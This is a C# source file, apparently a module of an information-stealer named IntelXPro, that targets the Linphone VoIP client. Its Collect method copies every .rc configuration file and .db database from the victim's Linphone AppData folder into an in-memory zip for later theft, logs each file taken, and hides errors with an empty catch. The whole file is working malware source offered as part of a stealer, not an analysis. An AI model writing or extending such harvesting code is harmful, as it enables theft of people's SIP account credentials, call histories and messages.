using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Linphone : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "linphone");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Linphone";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                try
                {
                    string[] rcFiles = Directory.GetFiles(appDataPath, "*.rc", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in rcFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Linphone\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }

                    string[] dbFiles = Directory.GetFiles(appDataPath, "*.db", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in dbFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Linphone\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
